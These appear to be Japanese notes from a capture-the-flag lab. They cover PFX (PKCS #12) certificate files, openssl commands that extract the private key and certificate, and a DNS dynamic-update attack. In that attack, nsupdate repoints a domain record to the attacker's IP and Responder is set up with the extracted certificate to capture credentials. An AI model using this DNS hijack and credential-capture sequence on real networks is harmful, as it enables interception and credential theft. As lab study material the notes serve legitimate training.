# pfxファイル

- 「秘密鍵」と「デジタル証明書」を一つのファイルにまとめたもの。正式には PKCS #12 形式と呼ばれる。
- 主に Microsoft IIS などの Windows 環境で、サーバー証明書のインポートやエクスポート、バックアップに使用される。
- `.p12` 拡張子の場合もあるが、中身はほぼ同じ。
- ブラウザの証明書管理画面でpfxファイルをインポートできる。

```sh
openssl pkcs12 -info -in ./cert.pfx
```

```sh
# 秘密鍵の抽出 (パスワード解除済み)
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
```

```sh
# 証明書の抽出
openssl pkcs12 -in cert.pfx -nokeys -out cert.pem
```

```sh
# 証明書の内容確認
openssl x509 -in cert.pem -text -noout
```

## DNS動的更新

DNS動的更新が有効な場合、pfxファイルとResponderを使って自分のマシンに認証情報を送信させられる可能性がある。

```sh
$ nsupdate      
> server 10.48.173.61
> update delete test.windcorp.thm
> send
> update add test.windcorp.thm 600 A 192.168.129.39
> send
```

pfxファイルを利用して、HTTPSとしてResponderを起動する設定

```sh
nano /etc/responder/Responder.conf

[HTTPS Server]
; Configure SSL Certificates to use
SSLCert = /home/kali/ctf/ra2/cert.pem
SSLKey = /home/kali/ctf/ra2/key.pem
```
